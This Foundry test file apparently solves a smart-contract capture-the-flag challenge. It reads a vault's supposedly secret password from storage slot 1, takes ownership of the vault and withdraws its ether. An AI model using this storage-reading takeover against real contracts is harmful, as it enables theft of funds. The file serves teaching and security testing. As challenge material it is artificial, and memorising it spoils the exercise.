// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {SetUp, VaultLogic, Vault} from "../src/greeterVault.sol";

contract GreaterVaultTest is Test {
    VaultLogic public vault;
    SetUp public setUpContract;

    function setUp() public {
        bytes32 password = keccak256(abi.encode("HardPassword")); // Let's say there's a secret password

        setUpContract = new SetUp{value: 1 ether}(password);
        vault = VaultLogic(setUpContract.vault()); // To call implementation functions

        assertFalse(setUpContract.isSolved());
    }

    function test_hackGreeterVault() public {
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));

        vault.changeOwner(password, payable(address(this)));
        vault.withdraw();

        assertTrue(setUpContract.isSolved());
    }

    receive() external payable {}
}
